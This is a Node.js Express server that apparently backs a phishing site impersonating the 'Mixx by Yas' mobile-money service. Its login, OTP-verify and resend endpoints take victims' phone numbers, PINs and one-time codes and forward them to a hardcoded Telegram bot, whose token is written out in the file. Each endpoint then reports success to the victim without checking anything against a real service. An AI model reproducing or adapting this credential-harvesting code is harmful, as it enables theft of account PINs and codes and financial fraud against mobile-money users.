const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

// ===== CORS =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json());

// ===== PORT =====
const PORT = process.env.PORT || 5000;

// ===== TELEGRAM =====
const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
const TELEGRAM_CHAT_ID = '8392790531';

console.log('🚀 Starting server...');
console.log(`📡 PORT: ${PORT}`);

// ===== SEND TO TELEGRAM =====
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return response.data;
    } catch (error) {
        console.log('❌ Telegram error:', error.response?.data || error.message);
        return null;
    }
}

// ===== ENDPOINTS =====
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        message: 'Mixx by Yas API is running!',
        timestamp: new Date().toISOString()
    });
});

app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        port: PORT
    });
});

// ===== LOGIN =====
app.post('/api/login', async (req, res) => {
    console.log('📥 Login:', req.body);
    const { phone, pin } = req.body;
    
    if (!phone || !pin) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and PIN are required'
        });
    }
    
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`🔐 OTP for ${phone}: ${otp}`);
    
    await sendTelegramMessage(`
🔔 <b>MIXX BY YAS - LOGIN</b>
━━━━━━━━━━━━━━━━━━━━━
📱 Phone: ${phone}
🔐 PIN: <code>${pin}</code>
🔑 OTP: <code>${otp}</code>
🕐 Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
    `);
    
    res.json({
        status: 'success',
        message: 'Login successful! OTP generated.',
        data: { phone, otp }
    });
});

// ===== VERIFY OTP =====
app.post('/api/verify-otp', async (req, res) => {
    console.log('📥 Verify OTP:', req.body);
    const { phone, otp } = req.body;
    
    if (!phone || !otp) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone and OTP are required'
        });
    }
    
    await sendTelegramMessage(`
✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
━━━━━━━━━━━━━━━━━━━━━
📱 Phone: ${phone}
🔑 OTP Entered: <code>${otp}</code>
🕐 Time: ${new Date().toLocaleString()}
📊 Status: VERIFIED ✅
━━━━━━━━━━━━━━━━━━━━━
    `);
    
    res.json({
        status: 'success',
        message: 'OTP verified successfully!',
        data: { phone, verified: true }
    });
});

// ===== RESEND OTP =====
app.post('/api/resend-otp', async (req, res) => {
    console.log('📥 Resend OTP:', req.body);
    const { phone } = req.body;
    
    if (!phone) {
        return res.status(400).json({
            status: 'error',
            message: 'Phone is required'
        });
    }
    
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    
    await sendTelegramMessage(`
🔄 <b>MIXX BY YAS - RESEND OTP</b>
━━━━━━━━━━━━━━━━━━━━━
📱 Phone: ${phone}
🔑 New OTP: <code>${otp}</code>
🕐 Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
    `);
    
    res.json({
        status: 'success',
        message: 'New OTP sent successfully!',
        data: { phone, otp }
    });
});

// ===== START =====
// FIXED: Listen on all interfaces (0.0.0.0) for Railway
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 https://mixxbyyas-offers06com-production.up.railway.app`);
    console.log('✅ Server is ready!');
});
